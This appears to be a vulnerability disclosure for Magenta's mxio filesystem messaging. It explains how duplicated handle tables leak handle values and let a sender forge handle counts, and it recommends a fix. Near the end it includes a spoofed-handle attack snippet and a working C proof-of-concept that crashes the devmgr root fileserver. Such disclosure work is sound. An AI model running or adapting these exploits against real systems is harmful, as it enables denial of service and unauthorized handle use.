Mxio messages leak handle values and allow attacks on handles

SUMMARY:
Mxio messages, which are used to carry filesystem requests and
responses, encode a list of handles.  These handles are sent twice
to the peer - onces as part of the message data, and once as a table
of handles.  This leads to security violations where handle values
from one process leak to another, and where one process can send
arbitrary handle values that get used by another process. It also
increases messaging overhead without benefit.

DETAILS:
The mxio library cooperates with servers such as devmgr to provide
filesystems to Magenta processes.  Filesystem operations are sent
from a process to a file server using the mxrio_msg_t message format:

struct mxrio_msg {
    mx_txid_t txid;                    // transaction id
    uint32_t op;                       // opcode
    uint32_t datalen;                  // size of data[]
    int32_t arg;                       // tx: argument, rx: return value
    union {
        int64_t off;                   // tx/rx: offset where needed
        uint32_t mode;                 // tx: Open
        uint32_t protocol;             // rx: Open
        uint32_t op;                   // tx: Ioctl
    } arg2;
    int32_t reserved;
    uint32_t hcount;                   // number of valid handles
    mx_handle_t handle[4];             // up to 3 handles + reply channel handle
    uint8_t data[MXIO_CHUNK_SIZE];     // payload
};

When sending this format over a channel to a server, the bytes
from "txid" to "data[datalen]" are sent to the server as
"bytes", and handles handle[0] to handle[hcount] are sent as 
handles.  A typical write would look like:

   mx_channel_write(server, 0, msg, MXRIO_HDR_SZ + msg->datalen,
                    msg->handle, msg->hcount);

This operation sends the hcount and handle[] values twice -- once
as raw bytes, and once as handles.  The raw bytes are delivered
without interpretation by the magenta kernel, while the handles are
moved from the sender to the receiver while translating their
handle values.  Sending the hcount and handle[] table as raw bytes
is an extraneous operation which does not provide much semantic
value.  It leads to messages being larger than they need to be,
but also leads to two security weaknesses.

Process handle values are leaked to the peer process when this
operation is performed.  This can be seen simply by receiving
the handle table into another table other than msg->handle.

   mxrio_msg_t msg;
   mx_handle_t tab[4];
   uint32_t nb, nh;
   mx_channel_read(chan, 0, &msg, tab, sizeof msg, 4, &nb, &nh);

Any handles that are received into tab[] will have corresponding
handle values in msg.handle[].  The values in the msg.handle[] table
will be the old handle values that existed in the peer process.
This is a violation of a security goal that handle values in one
process should never be leaked to other processes.  It can be used
to defeat the handle obfuscation performed by the Magenta kernel.

A second, and more serious, problem occurs when the receiver
receives such a message, reading the handle table into the message's
"handle" field.  A typical receive would look like:

   uint32_t nb, nh;
   mx_channel_read(chan, 0, &msg, &msg.handle, sizeof msg, 4, &nb, &nh);

Here the "nh" result (the number of handles actually received) may
differ from the msg.hcount field.  Any msg.handle[] values for entries
beyond the number of received handles (>= nh) will have arbitrary
values passed in by the caller.  These will not be trusted handle values
translated by the Magenta kernel.  If any of these handles are ever
used, a client will be able to trick the server into using one of
its handles in an inappropriate manner.  Alternately, a server could
trick a client into using the wrong handle.

Although servers do a great job verifying that the number of
handles received are the number expected, this last vulnerability
still occurs in practice.  This happens because of the order
of copying results out in the mx_channel_read system call.  Servers
receive a message with a call like:

  mx_channel_read(chan, 0, msg, msg->handle, sizeof msg, 4, &nb, &msg->hcount);

The kernel copies the data out in this order:

  1) copy the number of bytes to nb
  2) copy the number of handles to msg->hcount
  3) copy the data into &msg
  4) copy the handles into &msg.handle

In step 3, the trusted value of hcount is overwritten by the value
the caller placed in the msg->hcount structure that it sent.  This
value can be arbitrary, and is independent of the number of handles
the kernel transfered.  All validation code that bases decisions
on this value can be bypassed.  

A typical attack would be for an attacker to use the handle leak
to build information about the server's handle table (deobfuscating
handle values).  The attacker would then send a message that should
have one handle to the server, but without any handles.  The attacker
would still provide a value in msg.handle[0], and set msg.hcount to one.

   msg.op = MXRIO_READ;
   msg.datalen = 0xffffffff; // trigger an error
   msg.hcount = 1;
   msg.handle[0] = serverHandleValue;
   mx_channel_write(serv, 0, &msg, MXRIO_HDR_SZ, 0, 0); // send 0 handles

The receiver would think they received one handle, but the value
of msg.handle[0] would be completley controlled by the attacker.
If the server then performs an operation on the handle, such as
closing the handle after an error is detected, the server would be 
tricked into performing an unauthorized action.  Similar attacks
could trick a srever into sending a message to the wrong server.

A denial of service issue happens in code that trusts the hcount field:

    // ensure handle count specified by opcode matches reality
    if (msg->hcount != MXRIO_HC(msg->op)) {
        for (unsigned i = 0; i < msg->hcount; i++) {
            mx_handle_close(msg->handle[i]);
        }
        return ERR_IO;
    }

Since hcount can be arbitrary when receiving mxrio_msg_t messages
in this manner, a large value can cause msg->handle[i] to read
well beyond the message bounds. An attacker can take advantage of
this to crash servers.

RECOMMENDATION:

Stop sending the hcount field and handle[] table when sending mxrio_msg_t
messages.  This data is already passed in a secure manner by the
kernel when calling mx_channel_write and mx_channel_read.  This
can be done by moving these fields to the end of the mxrio_msg_t
structure (since data past the end of data[datalen] is not written).
However, this fix is complicated by code in devmgr.c that reads
data into a dc_msg_t structure and then treats it as an mxrio_msg_t
if the operation is MXRIO_OPEN.


EXAMPLE EXPLOIT:

The following program will send a message that claims to have
a large number of handles, but actually has none.  This will
cause the root fileserver to attempt to close all of these handles,
reading beyond the end of the stack and causing a crash.

/*
 * Crash the root filesystem server (devmgr).
 */
#include <stdio.h>
#include <string.h>
#include <magenta/syscalls.h>
#include <mxio/remoteio.h>

#include "private-remoteio.h" // stole a local copy of this file from mxio

/* steal a copy of mxio's root handle for ourselves */
mx_handle_t getRoot(void)
{
    mxrio_t *r = (mxrio_t*)mxio_root_handle;
    return r->h;
}

int 
main(int argc, char **argv)
{
    mxrio_msg_t msg;
    memset(&msg, 0, sizeof msg);
    msg.op = MXRIO_OPEN;    // wants 1 handle, we send zero
    msg.hcount = 0xfffffff; // make server walk past end of memory
    mx_handle_t root = getRoot();
    mx_status_t x = mx_channel_write(root, 0, &msg, MXRIO_HDR_SZ, 0, 0); // send no handles
    if(x != NO_ERROR) {
        printf("channel write failed %x\n", x);
        return 1;
    }
    return 0;
}

